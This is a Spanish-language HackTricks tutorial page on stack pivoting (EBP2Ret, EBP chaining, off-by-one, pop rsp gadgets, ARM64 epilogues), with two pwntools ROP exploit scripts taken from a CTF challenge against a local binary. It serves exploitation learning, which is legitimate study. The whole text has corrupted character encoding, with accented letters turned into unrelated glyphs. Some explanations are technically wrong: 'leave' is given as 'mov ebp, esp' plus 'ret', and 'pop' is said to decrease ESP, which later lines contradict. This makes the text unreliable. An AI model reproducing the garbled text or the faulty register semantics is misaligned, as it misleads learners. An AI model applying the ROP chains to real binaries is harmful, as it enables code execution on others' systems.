# Stack Pivoting - EBP2Ret - EBP chaining

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informaci칩n B치sica

Esta t칠cnica explota la capacidad de manipular el **Base Pointer (EBP)** para encadenar la ejecuci칩n de m칰ltiples funciones a trav칠s del uso cuidadoso del registro EBP y la secuencia de instrucciones **`leave; ret`**.

Como recordatorio, **`leave`** b치sicamente significa:
```
mov       ebp, esp
pop       ebp
ret
```
Y como el **EBP est치 en la pila** antes del EIP, es posible controlarlo controlando la pila.

### EBP2Ret

Esta t칠cnica es particularmente 칰til cuando puedes **alterar el registro EBP pero no tienes una forma directa de cambiar el registro EIP**. Aprovecha el comportamiento de las funciones cuando terminan de ejecutarse.

Si, durante la ejecuci칩n de `fvuln`, logras inyectar un **EBP falso** en la pila que apunta a un 치rea en memoria donde se encuentra la direcci칩n de tu shellcode (m치s 4 bytes para tener en cuenta la operaci칩n `pop`), puedes controlar indirectamente el EIP. A medida que `fvuln` retorna, el ESP se establece en esta ubicaci칩n creada, y la siguiente operaci칩n `pop` disminuye el ESP en 4, **haciendo que apunte efectivamente a una direcci칩n almacenada por el atacante all칤.**\
Nota c칩mo **necesitas conocer 2 direcciones**: La que donde va a ir el ESP, donde necesitar치s escribir la direcci칩n a la que apunta el ESP.

#### Construcci칩n del Exploit

Primero necesitas conocer una **direcci칩n donde puedas escribir datos / direcciones arbitrarias**. El ESP apuntar치 aqu칤 y **ejecutar치 el primer `ret`**.

Luego, necesitas conocer la direcci칩n utilizada por `ret` que **ejecutar치 c칩digo arbitrario**. Podr칤as usar:

* Una direcci칩n v치lida de [**ONE\_GADGET**](https://github.com/david942j/one\_gadget).
* La direcci칩n de **`system()`** seguida de **4 bytes basura** y la direcci칩n de `"/bin/sh"` (bits x86).
* La direcci칩n de un gadget de **`jump esp;`** ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) seguida del **shellcode** a ejecutar.
* Alguna cadena de [**ROP**](../rop-return-oriented-programing/).

Recuerda que antes de cualquiera de estas direcciones en la parte controlada de la memoria, debe haber **`4` bytes** debido a la parte de **`pop`** de la instrucci칩n `leave`. Ser칤a posible abusar de estos 4B para establecer un **segundo EBP falso** y continuar controlando la ejecuci칩n.

#### Exploit Off-By-One

Hay una variante espec칤fica de esta t칠cnica conocida como "Off-By-One Exploit". Se utiliza cuando solo puedes **modificar el byte menos significativo del EBP**. En tal caso, la ubicaci칩n de memoria que almacena la direcci칩n a la que saltar con el **`ret`** debe compartir los primeros tres bytes con el EBP, permitiendo una manipulaci칩n similar con condiciones m치s restringidas.\
Usualmente se modifica el byte 0x00 para saltar lo m치s lejos posible.

Adem치s, es com칰n usar un RET sled en la pila y colocar la verdadera cadena ROP al final para hacer m치s probable que el nuevo ESP apunte dentro del RET SLED y se ejecute la cadena ROP final.

### **Cadena EBP**

Por lo tanto, al poner una direcci칩n controlada en la entrada `EBP` de la pila y una direcci칩n para `leave; ret` en `EIP`, es posible **mover el `ESP` a la direcci칩n `EBP` controlada desde la pila**.

Ahora, el **`ESP`** est치 controlado apuntando a una direcci칩n deseada y la siguiente instrucci칩n a ejecutar es un `RET`. Para abusar de esto, es posible colocar en el lugar controlado del ESP esto:

* **`&(next fake EBP)`** -> Cargar el nuevo EBP debido a `pop ebp` de la instrucci칩n `leave`.
* **`system()`** -> Llamado por `ret`.
* **`&(leave;ret)`** -> Llamado despu칠s de que el sistema termina, mover치 el ESP al EBP falso y comenzar치 de nuevo.
* **`&("/bin/sh")`**-> Par치metro para `system`.

B치sicamente, de esta manera es posible encadenar varios EBP falsos para controlar el flujo del programa.

Esto es como un [ret2lib](../rop-return-oriented-programing/ret2lib/), pero m치s complejo sin un beneficio aparente, pero podr칤a ser interesante en algunos casos l칤mite.

Adem치s, aqu칤 tienes un [**ejemplo de un desaf칤o**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) que utiliza esta t칠cnica con un **leak de pila** para llamar a una funci칩n ganadora. Este es el payload final de la p치gina:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP podr칤a no ser utilizado

Como [**se explica en esta publicaci칩n**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), si un binario se compila con algunas optimizaciones, el **EBP nunca llega a controlar ESP**, por lo tanto, cualquier exploit que funcione controlando EBP b치sicamente fallar치 porque no tiene ning칰n efecto real.\
Esto se debe a que los **cambios de pr칩logo y ep칤logo** si el binario est치 optimizado.

* **No optimizado:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Optimizado:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## Otras formas de controlar RSP

### **`pop rsp`** gadget

[**En esta p치gina**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) puedes encontrar un ejemplo usando esta t칠cnica. Para este desaf칤o era necesario llamar a una funci칩n con 2 argumentos espec칤ficos, y hab칤a un **gadget `pop rsp`** y hay una **fuga de la pila**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

Consulta la t칠cnica ret2esp aqu칤:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## Referencias y Otros Ejemplos

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 bits, explotaci칩n off by one con una cadena rop que comienza con un ret sled
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 bits, sin relro, canary, nx y pie. El programa otorga un leak para stack o pie y un WWW de un qword. Primero obt칠n el leak de stack y usa el WWW para volver y obtener el leak de pie. Luego usa el WWW para crear un bucle eterno abusando de las entradas de `.fini_array` + llamando a `__libc_csu_fini` ([m치s informaci칩n aqu칤](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). Abusando de esta escritura "eterna", se escribe una cadena ROP en la .bss y se termina llam치ndola pivotando con RBP.

## ARM64

En ARM64, el **prologo y ep칤logos** de las funciones **no almacenan ni recuperan el registro SP** en la pila. Adem치s, la instrucci칩n **`RET`** no regresa a la direcci칩n apuntada por SP, sino **a la direcci칩n dentro de `x30`**.

Por lo tanto, por defecto, solo abusando del ep칤logo **no podr치s controlar el registro SP** sobrescribiendo algunos datos dentro de la pila. E incluso si logras controlar el SP, a칰n necesitar칤as una forma de **controlar el registro `x30`**.

*   prologo

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP apunta al registro de marco
```
*   ep칤logo

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

{% hint style="danger" %}
La forma de realizar algo similar a stack pivoting en ARM64 ser칤a poder **controlar el `SP`** (controlando alg칰n registro cuyo valor se pasa a `SP` o porque por alguna raz칩n `SP` est치 tomando su direcci칩n de la pila y tenemos un desbordamiento) y luego **abusar del ep칤logo** para cargar el registro **`x30`** desde un **`SP` controlado** y **`RET`** a 칠l.
{% endhint %}

Tambi칠n en la siguiente p치gina puedes ver el equivalente de **Ret2esp en ARM64**:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Consulta los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
